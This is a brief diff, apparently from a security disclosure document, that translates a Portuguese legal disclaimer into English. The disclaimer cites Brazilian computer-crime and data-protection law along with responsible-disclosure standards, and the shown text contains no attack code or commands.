-> O uso das informações, técnicas ou ferramentas aqui descritas em sistemas **sem autorização expressa é ilegal e antiético**, podendo resultar em responsabilidade criminal e civil.   
->   
-> Este documento segue os princípios de **Responsible Disclosure** e foi elaborado em conformidade com a **Lei nº 12.737/2012** (Lei Carolina Dieckmann), **LGPD (Lei nº 13.709/2018)** e as diretrizes éticas do EC-Council, OWASP e ISO/IEC 29147:2018.
+> The use of the information, techniques, or tools described herein on systems **without explicit authorization is illegal and unethical**, and may result in criminal and civil liability.   
+> This document follows the principles of **Responsible Disclosure** and was prepared in compliance with **Brazilian Law nº 12.737/2012** (Computer Crimes Act), **LGPD (Law nº 13.709/2018)** (Brazilian Data Protection Law), and the ethical guidelines of EC-Council, OWASP, and ISO/IEC 29147:2018.
 
 ---
 
